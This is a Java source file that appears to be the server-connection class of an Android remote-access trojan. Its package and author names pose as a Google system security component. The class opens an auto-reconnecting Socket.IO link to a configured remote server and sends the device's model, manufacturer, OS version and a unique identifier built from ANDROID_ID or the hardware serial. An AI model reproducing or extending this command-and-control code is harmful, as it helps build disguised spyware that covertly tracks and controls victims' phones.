package com.google.android.sys.security;

import android.os.Build;
import android.provider.Settings;
import android.content.SharedPreferences;
import android.content.Context;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

/**
 * Created by sys_security on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance;
    private io.socket.client.Socket ioSocket;

    private IOSocket(Context ctx) {
        try {
            String serverHost = ctx.getString(R.string.server_ip);
            String serverPort = ctx.getString(R.string.server_port);
            String deviceID = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            
            // Fallback for ID if ANDROID_ID is null or generic
            if (deviceID == null || deviceID.isEmpty()) {
                deviceID = "DEV-" + Build.BRAND + "-" + Build.MODEL + "-" + Build.SERIAL;
            }

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 3000;       // Thử lại sau 3 giây
            opts.reconnectionDelayMax = 10000;   // Tối đa 10 giây
            opts.timeout = 20000;               // Timeout kết nối 20 giây
            opts.forceNew = true;               
            
            opts.query = "model=" + android.net.Uri.encode(Build.MODEL) + 
                         "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) + 
                         "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) + 
                         "&id=" + deviceID;

            String baseUrl;
            if (serverHost.startsWith("http://") || serverHost.startsWith("https://")) {
                baseUrl = serverHost;
            } else {
                baseUrl = "http://" + serverHost;
            }

            if (serverPort != null && serverPort.length() > 0) {
                baseUrl = baseUrl + ":" + serverPort;
            }

            ioSocket = IO.socket(baseUrl, opts);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static IOSocket getInstance() {
        if (ourInstance == null) {
            Context ctx = MainService.getContextOfApplication();
            if (ctx != null) {
                ourInstance = new IOSocket(ctx);
            }
        }
        return ourInstance;
    }

    /**
     * Reset instance to force reconnection with new config
     */
    public static void resetInstance() {
        if (ourInstance != null && ourInstance.ioSocket != null) {
            ourInstance.ioSocket.disconnect();
            ourInstance.ioSocket.close();
        }
        ourInstance = null;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}
